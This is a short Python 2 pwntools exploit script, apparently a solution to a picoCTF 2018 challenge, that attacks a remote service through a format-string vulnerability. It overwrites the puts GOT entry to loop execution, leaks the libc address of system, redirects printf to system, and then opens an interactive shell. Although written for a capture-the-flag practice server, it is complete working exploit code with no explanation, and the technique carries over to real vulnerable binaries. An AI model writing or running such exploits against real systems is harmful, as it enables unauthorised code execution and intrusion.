#!/usr/bin/env python2
from pwn import *
from struct import pack,unpack
PUTS_GOT_PLT = 0x0804A01C
PUTS_GOT_PLT2 = 0x0804A01E
PRINTF_GOT_PLT = 0x0804A010
PRINTF_GOT_PLT2 = 0x0804A012
SYSTEM_GOT_PLT = 0x0804A020
VULN_ADDR_LOW = 0x85AB
VULN_ADDR_HIGH = 0x0804
r =  remote("2018shell.picoctf.com", 22462)
r.recvuntil("input your message:")
payload = "{}{}".format(struct.pack("<I",PUTS_GOT_PLT),struct.pack("<I",PUTS_GOT_PLT2))
written = len(payload)
payload += "%{}x".format(VULN_ADDR_LOW-written)
written = VULN_ADDR_LOW
payload += "%7$hn"
payload += "%{}x".format((VULN_ADDR_HIGH-written)%65536)
payload += "%8$hn"
r.sendline(payload)
r.recvuntil("input your message:")
payload = "{}SYSTEM_LIBC=%7$s".format(struct.pack("<I",SYSTEM_GOT_PLT))
r.sendline(payload)
r.recvuntil("SYSTEM_LIBC=")
system_addr = struct.unpack("<I",r.recvline()[:4])[0]
r.recvuntil("input your message:")
sys_high = (system_addr>>16)&0xffff # just to be sure
sys_low = system_addr&0xffff
payload = "{}{}".format(struct.pack("<I",PRINTF_GOT_PLT),struct.pack("<I",PRINTF_GOT_PLT2))
written = len(payload)
payload += "%{}x".format(sys_low-written)
written = sys_low
payload += "%7$hn"
payload += "%{}x".format((sys_high-written)%65536)
payload += "%8$hn"
r.sendline(payload)
r.recvuntil("input your message:")
r.sendline("sh")
r.interactive()